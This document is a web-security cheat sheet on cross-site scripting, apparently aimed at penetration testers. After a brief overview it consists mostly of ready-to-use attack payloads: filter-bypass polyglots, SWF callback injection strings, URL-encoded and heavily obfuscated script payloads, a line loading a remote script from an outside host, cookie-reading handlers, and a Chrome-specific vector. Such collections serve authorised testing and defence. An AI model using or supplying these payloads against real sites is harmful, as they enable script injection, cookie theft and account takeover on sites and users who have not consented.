# Cross-Site Scripting (XSS) Overview

Cross-Site Scripting (XSS) is a security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. A successful XSS attack leads to manipulation of the affected web application, potentially leading to unauthorized access to sensitive data.

### Core Concept

The core idea of XSS is to exploit the functionality of a web page that displays content to users. This can be achieved by injecting malicious scripts into areas where web applications display user-generated content.

### Time-Sensitive Testing: The 80/20 Rule

In time-sensitive testing environments, the 80/20 rule is often applicable. This principle suggests focusing on the 20% of areas that are most likely to yield 80% of the potential vulnerabilities. Many testers use Polyglot payloads, which are designed to work in multiple contexts and bypass various filters.

## XSS Payloads

### 1. Multi-Context, Filter Bypass Polyglot Payload #1 (Rsnake XSS Cheat Sheet)

```Javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

### 2. Multi-Context, Filter Bypass Polyglot Payload #2 (Ashar Javed XSS Research)

```Javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

### 3. Multi-Context Polyglot Payload (Mathias Karlsson)

```Javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

## Other XSS Observations

### Input Vectors:

- Customizable Themes & Profiles via CSS
- Event or meeting names
- URI-based vectors
- Integration with third-party platforms (e.g., Facebook)
- JSON POST values (check returning content type)
- File upload names
- Uploaded files (e.g., SWF, HTML)
- Custom error pages
- Fake parameters (e.g., `?realparam=1&foo=bar’+alert(/XSS/)+’`)
- Login and Forgot Password forms

## SWF Parameter XSS

### Common Params:

- `onload`
- `allowedDomain`
- `movieplayer`
- `xmlPath`
- `eventhandler`
- `callback` (more details on the OWASP page)

### Common Injection Strings:

```Javascript
\%22})))}catch(e){alert(document.domain);}//
```

```Javascript
"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
```

```Javascript
"a")(({type:"ready"}));}catch(e){alert(1)}//
```

## Different XSS Payloads

Various payloads are available for exploiting XSS vulnerabilities, each tailored to specific scenarios or application behaviors.

```Javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">

<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>

%3CScript%3Econfirm()%3C/Script%3E
src%27%27%20onerror=confirm(1)%20onerror=alert(1)
%3Cscript%20%3Eeval(String.fromCharCode(97,%20108,%20101,%20114,%20116,%2040,%2039,%2049,%2051,%2051,%2055,%2039,%2041))%3C/script%3E
%22%20onkeyup=%27alert(1)%27
%3Cscript%3E%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%29%28%29%3C/script%3E
<SVG ONLOAD=%26%2397%26%23108%26%23101%26%23114%26%23116(1337)>
<script >eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 49, 51, 51, 55, 39, 41))</script>
```

## XSS Vector (Chrome)

Specific vectors for browsers like Chrome can be used for targeted XSS attacks.

```HTML
<link rel='preload' href='#' as='script' onload='confirm(domain)'>
```